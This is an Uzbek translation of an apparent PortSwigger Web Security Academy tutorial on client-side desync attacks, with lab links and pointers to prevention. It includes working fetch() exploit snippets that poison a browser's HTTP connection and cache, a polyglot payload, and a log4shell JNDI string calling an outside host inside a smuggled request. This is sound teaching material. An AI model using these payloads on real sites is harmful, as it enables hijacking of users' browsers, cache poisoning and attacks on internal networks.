# Client-side desync

## Client-side desync

Klassik desync/request smuggling hujumlari oddiy brauzerlar yubora olmaydigan **ataylab noto'g'ri tuzilgan** requestlarga tayanadi. Bu ushbu hujumlarni front-end/backend arxitekturasidan foydalanadigan veb-saytlarga hujum qilishcheklaydi. Biroq,  [CL.0 hujumlarini](cl.0) ko'rib chiqganimizda o'rganganimizdek, butunlay brauzerga mos keladigan HTTP/1.1 requestlar yordamida desync-ni yuzaga keltirish mumkin. Bu server-side request smuggling uchun yangi imkoniyatlarni ochibgina qolmay, balki butunlay yangi tahdidlar sinfini - client-side desync hujumlarini ham ochib beradi.

## Client-side desync nima ? <a href="#what-is-a-client-side-desync" id="what-is-a-client-side-desync"></a>

Client-side desync (CSD) - bu foydalanuvchining brauzerini zaif saytga o'z ulanishini sinxrinlamaslikka majbur qiladigan hujum. Buni front-end va back-end server o'rtasidagi aloqani sinxronlashtirmaydigan muntazam request smuggling hujumlari bilan taqqoslash mumkin.

![](../../.gitbook/assets/image%20%284%29.png)

Veb-serverlar ba'zan requestning body ichini o'qimasdan `POST` requestlarga javob berishga undashadi. Agar ular keyinchalik brauzerga qo'shimcha requestlar uchun bir xil ulanishni qayta ishlatishga ruxsat bersa, bu client-side desync zaifligiga olib keladi.

CSD hujumi quyidagi bosqichlarni o'z ichiga oladi:

1. Foydalanuvchi zararli JavaScript kodi mavjud domendagi veb-sahifaga kiradi.
2. JavaScript kod foydalanuvchining brauzerini zaif veb-saytga so'rov yuborishiga sababchi bo'ladi. Bu uning tanasida oddiy request smuggling hujumi kabi hacker tomonidan boshqariladigan soʻrov prefiksini oʻz ichiga oladi.
3. Zararli prefiks brauzer bilan ulanishni desinxronlashtirib, birinchi requestga javob bergandan keyin serverning TCP/TLS socketida qoladi.
4. Keyin JavaScript kod zaharlangan ulanishda keyingi requestni ishga tushiradi. Bu serverdan zararli responseni keltirib chiqaradigan zararli prefiksga qo'shiladi.

Ushbu hujumlar, ikkita server o'rtasidagi tafovurlarga tayanmaydi, bu esa hatto bir serverli veb-saytlar ham zaif bo'lishi mumkinligini anglatadi.

:::info **Eslatma**
Ushbu hujumlar ishlashi uchun server HTTP/2 ni qo'llab-quvvatlamasligi kerakligini ta'kidlash muhimdir. Client-side desync HTTP/1.1 ulanishidan qayta foydalanishga tayanadi va odatda brauzerlar agar HTTP/2 mavjud bo'lsa undan foydalanishni afzal ko'radilar.
:::


## Client-side desync zaifliklari uchun sinov <a href="#testing-for-client-side-desync-vulnerabilities" id="testing-for-client-side-desync-vulnerabilities"></a>

Hujumni amalga oshirishda brauzerga tayanishning qo'shimcha murakkabligi tufayli, client-side desync zaifliklarini sinab ko'rishda rejali ish ko'rish muhimdir. Biz quyidagi ketma ketlik jarayonini tavsiya qilamiz. Bu hujumning har bir elementi haqidagi taxminlaringizni bosqichma-bosqich tasdiqlashingizni ta'minlaydi.

1. [Burp orqali potentsial desync vektorlarini tekshirish](client-side-desync#probing-for-client-side-desync-vectors)
2. [Burp orqali desync vektorlarni tasdiqlash](client-side-desync#confirming-the-desync-vector-in-burp)
3. [Brauzerda qilingan amallarni takrorlash uchun isbot yarating](client-side-desync#building-a-proof-of-concept-in-a-browser)
4. Exploit qilinadigan qismni aniqlang.
5. Burp orqali ishlaydigan [exploit ](client-side-desync#exploiting-client-side-desync-vulnerabilities)yasang
6. Brauzeringizda [exploit](client-side-desync#exploiting-client-side-desync-vulnerabilities)ni takrorlang .

[Burp Scanner ](https://portswigger.net/burp/vulnerability-scanner)ham, [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) extensioni ham ushbu jarayonning katta qismini avtomatlashtirishga yordam beradi, ammo uning qanday ishlashini tushunish uchun buni qo‘lda qanday qilishni bilish kerak.

### Client-side desync vektorlarini tekshirish <a href="#probing-for-client-side-desync-vectors" id="probing-for-client-side-desync-vectors"></a>

Client-side desync zaifliklarini sinashda birinchi qadam server `Content-Length` headerini e'tiborsiz qoldiradigan requestni aniqlash yoki yaratishdir. Ushbu amallarni tekshirishning eng oddiy usuli  belgilangan `Content-Lenght-ga`body hajmidan katta qiymat berib request yuborish:

* Agar request to'xtab qolsa yoki timeout bo'lsa, bu server headerlar tomonidan va'da qilingan qolgan baytlarni kutayotganini ko'rsatadi.
* Agar darhol javob olsangiz, CSD vektorini topgan bo'lasiz. Bu esa qo'shimcha tekshiruvni talab qiladi.

[CL.0  zaifliklari](cl.0)  bilan bo'lgani kabi, eng ko'p nomzodlar  POST requestlarini kutmaydigan endpointlar ekanligini aniqladik masalan statik fayllar yoki server-level redirectlar kabi.

Boshqacha tarzda, serverda xatolik yuzaga kelishiga sababchi bo'lib bu xatti-harakatni yuzaga keltirishingiz mumkin. Bunday holda, hali ham brauzerning domenlar bo'ylab yuboradigan requesti kerakligini unutmang. Amalda, siz faqat URL, body, shuningdek qancha imkoniyatlar bilan o'zgartira olashingizni va `Referer` headeri va `Content-Type` headerining ohiri kabi tugashini bildiradi

```http
Referer: https://evil-user.net/?%00
Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
```

Shuningdek, siz veb root ustida harakatlanish orqali server xatolarini yuzaga keltirishingiz mumkin. Esda tutingki, brauzerlar pathni to'g'irlaydi, shuning uchun siz bundan o'tish ketma-ketligi uchun URL-manzilni kodlashingiz kerak bo'ladi:

```
GET /%2e%2e%2f HTTP/1.1
```

### Burp orqali desync vektorini tasdiqlash <a href="#confirming-the-desync-vector-in-burp" id="confirming-the-desync-vector-in-burp"></a>

Shuni ta'kidlash kerakki, himoyasi mavjud ba'zi serverlar bodyni kutmasdan javob beradi, lekin u kelganida uni to'g'ri tahlil ham qiladi. Boshqa serverlar `Content-Length`to'g'ri ishlatmaydi, lekin javob bergandan so'ng darhol ulanishni yopadi, ularni foydalanishga yaroqsiz holga keltiradi.

Bularni filtrlash uchun, xuddi [CL.0 request smugglingni ](cl.0#testing-for-cl-0-vulnerabilities)tekshirishda boʻlgani kabi, birinchi requestning bodyidan ikkinchisi request response-iga taʼsir qilish uchun foydalana olasizmi yoki yoʻqmi bilish uchun bir xil ulanish orqali ikkita request yuborib koʻring.

### Brauzerda kontseptsiya isbotini yaratish <a href="#building-a-proof-of-concept-in-a-browser" id="building-a-proof-of-concept-in-a-browser"></a>

Burp yordamida mos vektorni aniqlaganingizdan so'ng, desync-ni brauzerda takrorlashingiz mumkinligini tekshirish muhimdir.

:::caution **Brauzer talablari**

Har qanday to'siq ehtimolini kamaytirish va testingiz o'zboshimchalik bilan foydalanuvchining brauzerini iloji boricha sinchiklab simulyatsiya qilishini ta'minlash uchun:

* **Burp Suite orqali trafikni proksi-serverdan o'tkazmaydigan** brauzerdan foydalaning - har qanday HTTP proksi-serveridan foydalanish hujumlaringiz muvaffaqiyatiga sezilarli ta'sir ko'rsatishi mumkin. Biz Chrome-ni tavsiya qilamiz, chunki uning ishlab chiquvchi vositalari ba'zi muammolarni xal qilish xususiyatlarini taqdim etadi.
* Har qanday brauzer kengaytmalarini o'chirib qo'ying.
:::

1. Foydalanuvchiga hujum qilish rejalashtirilgan saytga o'ting. Bu zaif saytning boshqa domenida bo'lishi va HTTPS orqali kirishi kerak. Laboratoriyalarimiz uchun siz taqdim etilgan ekspluatatsiya serveridan foydalanishingiz mumkin.
2. Brauzerning developer tools-ini oching va **Network** bo'limiiga o'ting.
3.  Quyidagi sozlashlarni bajaring:

    * **Preserve log** xususiyatini tanlang .
    * Headerlar ustida sichqonchaning o'ng tugmasini bosing va **Connection ID** ustunini yoqing.

    Bu brauzer tomonidan yuborilgan har bir so'rov " **Network**" bo'limida u qaysi ulanishdan foydalanganligi haqidagi ma'lumotlar bilan qayd etilishini ta'minlaydi. Bu keyinchalik har qanday muammolarni bartaraf etishga yordam beradi.
4. **Console** bo'limiiga o'ting va Burp-da sinovdan o'tgan desync sinovini takrorlash uchun `fetch() dan` foydalaning. Kod shunday ko'rinishi kerak:

```javascript
fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // zararli prefix
    mode: 'no-cors', // connection IDsi Network bo'limida ko'rinishini ta'minlaydi
    credentials: 'include' // "with-cookies" connection poolni zaharlaydi
}).then(() => {
    location = 'https://vulnerable-website.com/' // zaharlangan connectiondan foydalanadi
})
```

`POST` metodini belgilash va bodyga zararli prefiksni qo'shishdan tashqari, biz quyidagi parametrlarni ham berganimizga e'tibor bering:

* `mode: 'no-cors'`- Bu har bir requestning ulanish identifikatori "**Network"** bo'limida ko'rinishini ta'minlaydi, bu muammolarni bartaraf etishda yordam beradi.
* `credentials: 'include'`- Brauzerlar odatda cookie-fayllar va cookie-fayllarsiz requestlar uchun alohida **connection pool**lardan foydalanadilar. Bu xususiyat siz hohlagan ko'plab exploitlar uchun "with-cookies" pooliini zaharlashingizni ta'minlaydi.

Ushbu buyruqni ishga tushirganingizda, **Network** bo'limida ikkita requestni ko'rishingiz kerak. Birinchi request odatiy responseni olishi kerak. Agar ikkinchi request zararli prefiksga javob olsa (hozirgi holda 404), bu sizning brauzeringizdan desync-ni muvaffaqiyatli ishga tushirganingizni tasdiqlaydi.

### Redirectlarni boshqarish <a href="#handling-redirects" id="handling-redirects"></a>

Yuqorida aytib o'tganimizdek,client-side desync uchun endpointlarga requestlar yuborish server-level redirectlarni yuzaga keltirishning asosiy vektori hisoblanadi. Bu Exploitni yasashda kichik to'siq bo'ladi, chunki brauzerlar ushbu redirectga o'tib ketib, hujumlar ketma-ketligini buzadi. Yaxshiyamki buning oson yechim bor.

Birinchi request uchun `mode: '``cors``'` xususiyatini sozlash orqali CORS errorini ataylab yuzaga keltirishingiz mumkin, bu esa brauzerning redirectga o'tib ketishiga to'sqinlik qiladi. `Then()` o'rniga `catch()` ni chaqirish orqali hujumlar ketma-ketligini davom ettirishingiz mumkin. Masalan:

```javascript
fetch('https://vulnerable-website.com/redirect-me', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    location = 'https://vulnerable-website.com/'
})
```

Ushbu yondashuvning yomon tomoni shundaki, siz **Network** bo'limida connection IDni ko'ra olmaysiz, bu esa muammolarni bartaraf etishni qiyinlashtirishi mumkin.

## Client-side desync zaifliklarini exploit qilish <a href="#exploiting-client-side-desync-vulnerabilities" id="exploiting-client-side-desync-vulnerabilities"></a>

Bir marta [to'g'ri keladigan vektorni topganingizda ](client-side-desync#probing-for-client-side-desync-vectors)va [brauzerda desync-ni muvaffaqiyatli amalga oshirishingiz mumkinligini tasdiqlaganingizdan so'ng](client-side-desync#building-a-proof-of-concept-in-a-browser), exploit qilinadigan joylarni qidirishni boshlashga tayyorsiz.

### Klassik hujumlarning client-sidedagi o'zgarishlari <a href="#client-side-variations-of-classic-attacks" id="client-side-variations-of-classic-attacks"></a>

Siz server tomonidagi request smuggling bilan [bir xil hujumlarni](../http-request-smuggling/foydalanish) amalga oshirish uchun ushbu usullardan foydalanishingiz mumkin. Sizga kerak bo'ladigan narsa - foydalanuvchi uning brauzeri hujumni boshlashiga sababchi bo'lishi uchun zararli veb-saytga kirishidir.

:::caution **Lab**
 [Client-side desync ≫](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)
:::

### Client-side cache poisoning <a href="#client-side-cache-poisoning" id="client-side-cache-poisoning"></a>

[On-site redirect-ni open redirect-ga aylantirish](../http-request-smuggling/foydalanish#http-request-smuggling-orqali-on-site-redirection-ni-open-redirection-ga-aylantirish) uchun server-side desync-dan qanday foydalanishingiz mumkinligini avvalroq koʻrib chiqdik, bu sizga JavaScript resource importini o'g'irlash imkonini beradi. Faqat client-side desync-dan foydalanibgina bir xil natijaga erishishingiz mumkin, ammo to'g'ri ulanishni o'z vaqtida zaharlash qiyin bo'lishi mumkin. Buning o'rniga brauzer keshini zaharlash uchun desync-dan foydalanish ancha oson. Xullas, resursni yuklash uchun qaysi connectiondan foydalanilganligi haqida havotirlanmasangiz ham bo'ladi.

Bu bo'limda biz sizga ushbu hujumni yaratish jarayonini ko'rsatamiz. Bu quyidagi larni o'z ichiga oladi:

1. [To'g'ri keladigan CSD vektorini aniqlang](client-side-desync#testing-for-client-side-desync-vulnerabilities) va brauzer ulanishini desync qiling.
2. [Redirect bilan keshni zaharlash uchun desync qilingan ulanishdan foydalaning.](client-side-desync#redirect-bilan-cacheni-zaharlash)
3. [Target domendan resource importini ishga tushiring.](client-side-desync#resurs-importini-ishga-tushirish)
4. [Payloadni yuborish](client-side-desync#foydali-yukni-yetkazib-berish)

:::info **Eslatma**

Ushbu hujumni brauzerda sinab ko'rayotganda, har bir sinov o'rtasida keshni tozalaganingizga amin bo'ling. ( **Settings > Clear browsing data > Cached images files** )
:::

### **Redirect bilan cacheni zaharlash**

Bir marta CSD vektorini topganingizdan so'ng va uni brauzerda nusxasini yaratishingiz mumkinligini tasdiqlaganingizdan so'ng, to'g'ri keladigan redirect qiluvchi qismni aniqlashingiz kerak. Shundan so'ng, keshni zaharlash ancha soddalashadi.

Birinchidan, smuggled prefiks sizning zararli payloadingiz joylashgan domenga redirect qilishni boshlashi uchun o'zingiz tuzgan POCni o'zgartiring. Keyin, JavaScript fayli uchun keyingi requestni direct requestga o'zgartiring.

Ntijada kod quyidagicha ko'rinishi kerak:

```html
<script>
    fetch('https://vulnerable-website.com/desync-vector', {
        method: 'POST',
        body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
        credentials: 'include',
        mode: 'no-cors'
    }).then(() => {
        location = 'https://vulnerable-website.com/resources/target.js'
    })
</script>
```

Bu skriptingizga son sanoqsiz marta redirect qilish bilan bo'lsa ham keshni zaharlaydi. Buni brauzerda, skriptni ko'rish va dev tools-dagi **Network** bo'limini tekshirish orqali tasdiqlashingiz mumkin.

:::info **Eslatma**

Target domenga yuqori ahamiyatga ega navigatsiya orqali keyingi requestni ishga tushirishingiz kerak brauzerlar o'z keshlarini qismlarga ajratishi tufayli fetch() yordamida domenlararo request yuborish noto'g'ri keshni zaharlaydi.
:::

### **Resurs importini ishga tushirish**

Foydalanuvchini cheksiz loopga kiritib qo'yish biroz uning jahlini chiqarishi mumkin, ammo bu unchalik katta exploit emas. Endi siz skriptingizni yanada rivojlantirishingiz kerak, shunda brauzer allaqachon zaharlangan cacheni qaytarsa, u zaif saytdagi resurslarni import qilishni boshlaydigan sahifaga o'tadi. Bunga brauzer oynasi allaqachon skriptingizni ko'rgan-ko'rmaganligiga qarab turli xil kodlarni bajarish uchun shartli statement-lar yordamida osonlik bilan erishiladi.

Brauzer resursni target saytga import qilishga uringanda, u zaharlangan kesh yozuvidan foydalanadi va uchinchi marta zararli sahifangizga qayta yo'naltiriladi.

### **Payloadni yuborish**

Ushbu bosqichda siz hujum uchun poydevor o'rnatdingiz, ammo oxirgi vazifa payloadni qanday yuborishni ishlab chiqishdir.

Dastlab, foydalanuvchining brauzeri zararli sahifangizni HTML sifatida ochadi va sayt tarkibida joylashtirilgan JavaScript kodni ishga tushiradi. Natijada u target domenga JavaScript resursini import qilishga uringanida va zararli sahifangizga yoʻnaltirilganda, skript ishlamaganini sezasiz. Buning sababi, brauzer JavaScript-ni kutayotgan paytda siz hali ham HTMLni ishlatyapsiz.

Haqiqiy exploit uchun sizga bir xil endpointdan oddiy JavaScript-ga xizmat ko'rsatish usuli kerak, shu bilan birga sozlash requestiga xalaqit bermaslik uchun bu faqat ushbu ohirgi bosqichda bajarilishini ta'minlash kerak.

Yana bir usullardan biri HTML kodini JavaScript kommentariyasiga olish orqali poliglot payloadini yaratishdir:

```javascript
alert(1);
/*
<script>
    fetch( ... )
</script>
*/
```

Brauzer sahifani HTML sifatida yuklaganida, u faqat `<script>`teglardagi JavaScript-ni bajaradi. Natijada, uni JavaScript tarkibida yuklaganida, u faqat `alert()` ni bajaradi, qolganini dasturchining kommentariyasi sifatida o'qiydi.

:::caution **Lab**
 [Client-side desync orqali Browser cache poisoning ≫](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-browser-cache-poisoning-via-client-side-desync)
:::

Ushbu zaiflikni qanday qilib topganimiz haqida ko'proq ma'lumot olish uchun, PortSwigger Research tomonidan [" Brauzer tomonidan boshqariladigan sinxronizatsiya hujumlari:  HTTP request smugglingning yangi chegarasi](https://portswigger.net/research/browser-powered-desync-attacks#cisco)" ga qarang.

### Ichki infratuzilmaga qarshi hujumlar <a href="#pivoting-attacks-against-internal-infrastructure" id="pivoting-attacks-against-internal-infrastructure"></a>

Ko'pgina server-side desync hujumlari HTTP headerlarini faqat Burp Repeater kabi vositalar yordamida boshqarishni o'z ichiga oladi. Misol uchun, foydalanuvchining brauzerini `User-Agent` headerda log4shell payloadini joylab request yuborishga majburlash mumkin emas:

```http
GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

Bu shuni anglatadiki, bu hujumlar odatda siz bevosita kirishingiz mumkin bo'lgan veb-saytlar bilan cheklangan. Biroq, agar veb-sayt client-side desync-ga qarshi himoyasiz bo'lsa, foydalanuvchining brauzerini quyidagi so'rovni yuborishga undash orqali kerakli natijaga erishishingiz mumkin:

```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 etc.
Content-Length: 86

GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

Barcha requestlar foydalanuvchining brauzeridan kelib chiqqanligi sababli, bu sizga ular kirishi mumkin bo'lgan har qanday veb-saytga hujum qilish imkonini beradi. Bunga ishonchli intranetlarda joylashgan yoki IP-ga asoslangan himoya ortida yashiringan saytlar kiradi.

## Qanday qilib client-side desync zaifligining oldi olinadi <a href="#how-to-prevent-client-side-desync-vulnerabilities" id="how-to-prevent-client-side-desync-vulnerabilities"></a>

Client-side desync zaifliklari va desinxronlash hujumining boshqa shakllarini oldini olish uchun qilishingiz mumkin bo'lgan yuqori darajali ba'zi choralarni o'rganish uchun [HTTP request smuggling zaifliklarni qanday oldini olish mumkin](../http-request-smuggling/#qanday-qilib-http-request-smuggling-zaifliklarini-oldini-olish-mumkin) nomli mavzuni o'qing.

:::info **Keyingisi nima?**
Siz [CL.0](cl.0) va [CSD](client-side-desync) hujumlari haqida bilib oldingiz, lekin ko'rinishidan xavfsiz koʻrinadigan veb-saytlarda server-side va client-side exploitlarini yuzaga keltirishi mumkin boʻlgan yana bir desync vektori mavjud. Batafsil ma’lumot olish uchun [pauza asosidagi desinxronlash zaiflik](pause-based-desync)larini ko‘rib chiqing
:::
